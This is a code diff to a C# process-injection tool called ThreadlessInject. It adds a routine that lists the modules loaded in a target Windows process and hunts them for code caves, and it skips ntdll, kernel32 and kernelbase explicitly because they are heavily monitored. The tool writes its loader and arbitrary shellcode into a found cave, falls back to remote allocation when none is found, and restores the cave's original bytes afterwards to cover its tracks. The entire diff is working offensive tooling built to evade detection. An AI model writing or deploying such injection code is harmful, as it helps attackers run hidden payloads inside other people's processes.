@@ -1,15 +1,205 @@
 ﻿using Mono.Options;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 
 namespace ThreadlessInject;
 
 using static Native;
 using static Win32;
+
+public class RemoteModuleInfo
+{
+    public ulong BaseAddress { get; set; }
+    public string FullPath { get; set; }
+    public uint Size { get; set; }
+}
+
+public class RemoteCaveInfo
+{
+    public ulong BaseAddress { get; set; }
+    public string FullPath { get; set; }
+}
+
+public static class RemoteProcesser
+{
+    private struct MODULEINFO
+    {
+        public IntPtr lpBaseOfDll;
+        public uint SizeOfImage;
+        public IntPtr EntryPoint;
+    }
+
+    [DllImport("psapi.dll", SetLastError = true)]
+    private static extern bool EnumProcessModulesEx(
+        IntPtr hProcess,
+        [Out] IntPtr[] lphModule,
+        uint cb,
+        out uint lpcbNeeded,
+        uint dwFilterFlag);
+
+    [DllImport("psapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    private static extern uint GetModuleFileNameEx(
+        IntPtr hProcess,
+        IntPtr hModule,
+        StringBuilder lpBaseName,
+        nint nSize);
+
+
+    [DllImport("psapi.dll", SetLastError = true)]
+    private static extern bool GetModuleInformation(
+            IntPtr hProcess,
+            IntPtr hModule,
+            out MODULEINFO lpmodinfo,
+            uint cb);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool ReadProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        [Out] byte[] lpBuffer,
+        int nSize,
+        out int lpNumberOfBytesRead);
+    private const uint LIST_MODULES_ALL = 0x03;
+
+    private static NTSTATUS QueryRemoteProcessModules(IntPtr hProcess, out List<RemoteModuleInfo> modules)
+    {
+        modules = new List<RemoteModuleInfo>();
+
+        if (!EnumProcessModulesEx(hProcess, null, 0, out uint needed, LIST_MODULES_ALL))
+        {
+            return NTSTATUS.Unsuccessful;
+        }
+
+        int numModules = (int)(needed / IntPtr.Size);
+        IntPtr[] hModules = new IntPtr[numModules];
+
+        if (!EnumProcessModulesEx(hProcess, hModules, needed, out needed, LIST_MODULES_ALL))
+        {
+            return NTSTATUS.Unsuccessful;
+        }
+
+        StringBuilder pathBuilder = new StringBuilder(260);
+        foreach (var hMod in hModules)
+        {
+            if (hMod == IntPtr.Zero) continue;
+
+            // query remote module info (BaseAddress, SizeOfImage)
+            if (!GetModuleInformation(hProcess, hMod, out MODULEINFO modInfo, (uint)Marshal.SizeOf<MODULEINFO>()))
+            {
+                continue;
+            }
+
+            pathBuilder.Clear();
+            if (GetModuleFileNameEx(hProcess, hMod, pathBuilder, 260) > 0)
+            {
+                modules.Add(new RemoteModuleInfo
+                {
+                    BaseAddress = (ulong)modInfo.lpBaseOfDll.ToInt64(),
+                    FullPath = pathBuilder.ToString(),
+                    Size = modInfo.SizeOfImage
+                });
+            }
+        }
+
+        return NTSTATUS.Success;
+    }
+
+    // skips the main exe, as well as heavily monitored Dlls like ntdll.dll, kernel32.dll, kernelbase.dll
+    public static RemoteCaveInfo FindCodeCave(IntPtr hProcess, int requiredSize)
+    {
+        var bases = new List<RemoteModuleInfo>();
+        var status = QueryRemoteProcessModules(hProcess, out var modules);
+        if (status != NTSTATUS.Success)
+        {
+            Console.WriteLine($"[!] Failed to query remote process modules: {status}");
+        }
+
+        for (int i = 0; i < modules.Count; i++)
+        {
+            var module = modules[i];
+            if (module.FullPath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
+                module.FullPath.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase) ||
+                module.FullPath.EndsWith("kernel32.dll", StringComparison.OrdinalIgnoreCase) ||
+                module.FullPath.EndsWith("kernelbase.dll", StringComparison.OrdinalIgnoreCase))
+            {
+                continue;
+            }
+
+            // read the entire module image into a local buffer
+            byte[] moduleBytes = new byte[module.Size];
+            uint bytesToRead = module.Size;
+            var buf = Marshal.AllocHGlobal((IntPtr)bytesToRead);
+
+            NTSTATUS st = ReadVirtualMemory(
+                hProcess,
+                (IntPtr)module.BaseAddress,
+                buf,
+                (uint)bytesToRead,
+                out var bytesRead);
+
+            if (st != NTSTATUS.Success || bytesRead != bytesToRead)
+            {
+                Console.WriteLine($"[!] Failed to read module memory of {module.FullPath}, skipping");
+                continue;
+            }
+
+            // scan for contiguous padding bytes
+            int consecutiveCount = 0;
+            int candidateStartIndex = -1;
+            int safeStart = 0x1000; // skip the first 4kB of the module to avoid overwriting the PE header and import table
+            int[] paddingBytes = new int[] { 0x00, 0x90, 0xCC };
+
+            for (int b = safeStart; b < moduleBytes.Length; b++)
+            {
+                if (paddingBytes.Contains(moduleBytes[b]))
+                {
+                    if (consecutiveCount == 0)
+                    {
+                        candidateStartIndex = b;
+                    }
+
+                    consecutiveCount++;
+
+                    if (consecutiveCount >= requiredSize)
+                    {
+                        ulong caveAddress = module.BaseAddress + (ulong)candidateStartIndex;
+                        Console.WriteLine($"[=] Found code cave of size {requiredSize} at 0x{caveAddress:x}");
+                        // dump the first 1kB of the code cave for inspection
+                        byte[] caveChunk = new byte[1024];
+                        Array.Copy(moduleBytes, candidateStartIndex, caveChunk, 0, 1024);
+                        //Console.WriteLine($"[=] Cave bytes: {BitConverter.ToString(caveChunk).Replace("-", " ")}");
+                        return new RemoteCaveInfo
+                        {
+                            BaseAddress = caveAddress,
+                            FullPath = module.FullPath
+                        };
+                    }
+                }
+                else
+                {
+                    if (consecutiveCount > 1)
+                    {
+                        Console.WriteLine($"[=] Resetting consecutive count {consecutiveCount} at index {b} in module {module.FullPath}");
+                    }
+                    consecutiveCount = 0;
+                    candidateStartIndex = -1;
+                }
+            }
+
+            Console.WriteLine("[!] No suitable code cave found of the requested size.");
+            return new RemoteCaveInfo();
+        }
+
+        return new RemoteCaveInfo();
+    }
+}
 
 internal static class Program
 {
@@ -178,26 +368,6 @@ internal static class Program
         writer.Flush();
     }
 
-    private static ulong FindMemoryHole(IntPtr hProcess, ulong exportAddress, int size)
-    {
-        ulong remoteLoaderAddress;
-        var foundMemory = false;
-
-        for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
-             remoteLoaderAddress < exportAddress + 0x70000000;
-             remoteLoaderAddress += 0x10000)
-        {
-            var status = AllocateVirtualMemory(hProcess, remoteLoaderAddress, size);
-            if (status != NTSTATUS.Success)
-                continue;
-
-            foundMemory = true;
-            break;
-        }
-
-        return foundMemory ? remoteLoaderAddress : 0;
-    }
-
     private static byte[] ReadPayload(string path)
     {
         if (File.Exists(path))
@@ -297,18 +467,51 @@ internal static class Program
 
         var shellcode = LoadShellcode(shellcodeStr);
 
-        var loaderAddress = FindMemoryHole(
-            hProcess,
-            (ulong)exportAddress,
-            ShellcodeLoader.Length + shellcode.Length);
+        // try to find "unused" code, else fall back to AllocMem
+        IntPtr loaderAddress = IntPtr.Zero;
+        int loaderTotalSize = ShellcodeLoader.Length + shellcode.Length;
+        var CodeCave = RemoteProcesser.FindCodeCave(hProcess, loaderTotalSize);
+        
+        bool foundCodeCave = CodeCave.BaseAddress != 0;
+        byte[] codeCaveOriginalBytes = new byte[loaderTotalSize];
+        IntPtr codeCaveOriginalPtr = Marshal.AllocHGlobal(loaderTotalSize);
 
-        if (loaderAddress == 0)
+        if (foundCodeCave)
         {
-            Console.WriteLine("[!] Failed to find a memory hole, bailing");
-            return;
+            byte[] caveBuffer = new byte[loaderTotalSize];
+            NTSTATUS st = ReadVirtualMemory(
+                hProcess,
+                (IntPtr)CodeCave.BaseAddress,
+                codeCaveOriginalPtr,
+                (uint)loaderTotalSize,
+                out var bytesRead);
+            if (st == NTSTATUS.Success && bytesRead == loaderTotalSize)
+            {
+                loaderAddress = (IntPtr)CodeCave.BaseAddress;
+                Marshal.Copy(codeCaveOriginalPtr, codeCaveOriginalBytes, 0, loaderTotalSize);
+            }
+            else
+            {
+                Console.WriteLine($"[!] Failed to read code cave memory of {CodeCave.FullPath}, falling back to allocation");
+            }
+        }
+        else
+        {
+            Console.WriteLine("[-] Failed to find a code cave, falling back to allocation");
+        }
+        Marshal.FreeHGlobal(codeCaveOriginalPtr);
+
+        if (loaderAddress == IntPtr.Zero)
+        {
+            NTSTATUS st = AllocateVirtualMemory(hProcess, ref loaderAddress, (IntPtr)loaderTotalSize);
+            if (st != NTSTATUS.Success)
+            {
+                Console.WriteLine("[!] Also failed to allocate memory in the remote process");
+                return;
+            }
         }
 
-        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within PID {pid}");
+        Console.WriteLine($"[=] Allocated loader and shellcode at 0x{(long)loaderAddress:x} within PID {pid}");
 
         var kernel32Handle = GetModuleHandle("kernel32.dll");
         if (kernel32Handle == IntPtr.Zero)
@@ -336,7 +539,7 @@ internal static class Program
             0xC3                         // [Index 11]    ret (call rax, i.e. the loader)
         };
         // Copy the 8-byte address to the shellcode loader into indices 2 through 9
-        BitConverter.GetBytes(loaderAddress).CopyTo(callOpCode, 2);
+        BitConverter.GetBytes(loaderAddress.ToInt64()).CopyTo(callOpCode, 2);
 
         // write the hook (call) to the loader stub
         ProtectVirtualMemory(
@@ -444,11 +647,56 @@ internal static class Program
 
         if (executed)
         {
-            FreeVirtualMemory(
-                hProcess,
-                (IntPtr)loaderAddress);
+            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s and export is restored");
 
-            Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");
+            if (foundCodeCave)
+            {
+                // restore the original bytes of the code cave
+                NTSTATUS st;
+                st = ProtectVirtualMemory(
+                    hProcess,
+                    (IntPtr)CodeCave.BaseAddress,
+                    (uint)loaderTotalSize,
+                    MemoryProtection.ExecuteReadWrite,
+                    out var oldProtectCave);
+                if (st != NTSTATUS.Success)
+                {
+                    Console.WriteLine($"[!] Failed to unprotect code cave at 0x{CodeCave.BaseAddress:x}");
+                    return;
+                }
+                st = WriteVirtualMemory(
+                    hProcess,
+                    (IntPtr)CodeCave.BaseAddress,
+                    codeCaveOriginalBytes,
+                    out var bytesWrittenRe);
+                if (st != NTSTATUS.Success)
+                { 
+                    Console.WriteLine($"[!] Failed to restore code cave at 0x{CodeCave.BaseAddress:x}");
+                    return;
+                }
+                st = ProtectVirtualMemory(
+                    hProcess,
+                    (IntPtr)CodeCave.BaseAddress,
+                    (uint)loaderTotalSize,
+                    oldProtectCave,
+                    out _);
+                if (st != NTSTATUS.Success)
+                {
+                    Console.WriteLine($"[!] Failed to protect code cave at 0x{CodeCave.BaseAddress:x}");
+                    return;
+                }
+
+                Console.WriteLine($"[+] Restored original bytes of code cave at 0x{CodeCave.BaseAddress:x}");
+
+            } 
+            else
+            {
+                // just free the allocated memory for the loader and shellcode
+                FreeVirtualMemory(
+                    hProcess,
+                    (IntPtr)loaderAddress);
+            }
+
         }
         else
         {
